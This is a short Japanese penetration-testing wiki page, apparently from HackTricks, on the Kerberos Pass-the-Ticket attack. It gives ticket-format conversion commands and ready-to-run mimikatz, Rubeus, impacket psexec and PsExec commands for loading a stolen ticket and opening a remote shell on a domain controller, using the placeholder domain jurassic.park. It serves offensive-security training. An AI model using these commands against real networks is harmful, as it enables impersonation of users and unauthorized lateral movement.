# Pass the Ticket

{{#include ../../banners/hacktricks-training.md}}

## Pass The Ticket (PTT)

**Pass The Ticket (PTT)**攻撃手法では、攻撃者はパスワードやハッシュ値ではなく、**ユーザーの認証チケットを盗みます**。その後、この盗まれたチケットを使用して**ユーザーになりすまし**、ネットワーク内のリソースやサービスへの不正アクセスを取得します。<sup>[[1]](#references)</sup>

**参照**:

- [Windowsからのチケットの収集](../../network-services-pentesting/pentesting-kerberos-88/harvesting-tickets-from-windows.md)
- [Linuxからのチケットの収集](../../network-services-pentesting/pentesting-kerberos-88/harvesting-tickets-from-linux.md)

### **LinuxとWindows間でのチケットの交換**

[**ticket_converter**](https://github.com/Zer1t0/ticket_converter)ツールは、チケット本体と出力ファイルだけを使用してチケット形式を変換します。
```bash
python ticket_converter.py velociraptor.ccache velociraptor.kirbi
Converting ccache => kirbi

python ticket_converter.py velociraptor.kirbi velociraptor.ccache
Converting kirbi => ccache
```
Windowsでは[Kekeo](https://github.com/gentilkiwi/kekeo)を使用できます。

### Pass The Ticket Attack
```bash:Linux
export KRB5CCNAME=/root/impacket-examples/krb5cc_1120601113_ZFxZpK
python psexec.py jurassic.park/trex@labwws02.jurassic.park -k -no-pass
```

```bash:Windows
#Load the ticket in memory using mimikatz or Rubeus
mimikatz.exe "kerberos::ptt [0;28419fe]-2-1-40e00000-trex@krbtgt-JURASSIC.PARK.kirbi"
.\Rubeus.exe ptt /ticket:[0;28419fe]-2-1-40e00000-trex@krbtgt-JURASSIC.PARK.kirbi
klist #List tickets in cache to cehck that mimikatz has loaded the ticket
.\PsExec.exe -accepteula \\lab-wdc01.jurassic.park cmd
```
## 参考資料

- [1] [Kerberos (II): Kerberosを攻撃する方法](https://www.tarlogic.com/blog/how-to-attack-kerberos/)

{{#include ../../banners/hacktricks-training.md}}
